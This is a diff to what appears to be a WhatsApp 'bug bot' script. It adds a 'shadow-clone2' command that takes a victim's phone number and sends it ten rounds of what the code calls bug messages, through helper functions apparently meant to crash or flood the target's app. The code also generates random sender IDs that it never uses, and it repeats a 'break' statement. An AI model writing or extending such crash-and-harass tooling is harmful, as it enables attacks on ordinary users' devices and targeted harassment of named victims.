@@ -27474,6 +27474,36 @@ await locationalya(target, force)
 }
 await replygcalya(`Successfully Send Bug to ${alyavictim} Using ${command}. ✅`)
 }
+case 'shadow-clone2': {
+    if (!AlyaTheQueen) return
+    if (!q) return replygcalya(`Usage .${command} 2348100835767`)
+
+    let alyavictim = q.replace(/[^0-9]/g, "")
+    if (alyavictim.startsWith('0')) return replygcalya(`Example: .${command} 2348100835767`)
+
+    // Prepare the victim's target JID
+    let victimTarget = alyavictim + '@s.whatsapp.net';
+
+    // Generate and send bug messages from 10 random JIDs
+    await replygcalya(`In process....`)
+    
+    for (let i = 0; i < 10; i++) {
+        // Generate a random number for the JID
+        let randomNum = Math.floor(Math.random() * 10000000000); // Adjust range as necessary
+        let randomJID = `+1203632757${randomNum}@s.whatsapp.net`; // Adjust country code if needed
+        
+        // Send the bug message from the random JID to the victim
+        await listxeonfck(victimTarget, oneclickalya) // Send the bug message
+        await locationalya(victimTarget, force) // Additional actions, if necessary
+        await alyakillpic(victimTarget, oneclickalya) // Additional actions, if necessary
+        await locationalya(victimTarget, force) // Additional actions, if necessary
+        await blackening(victimTarget, force2) // Additional actions, if necessary
+        await locationalya(victimTarget, force) // Additional actions, if necessary
+    }
+
+    await replygcalya(`Successfully sent bug message to ${alyavictim} from 10 random JIDs using ${command}. ✅`)
+}
+break;
 break
 case 'amountbug': {
 if (!isPremium) return replygcalya(mess.premium)
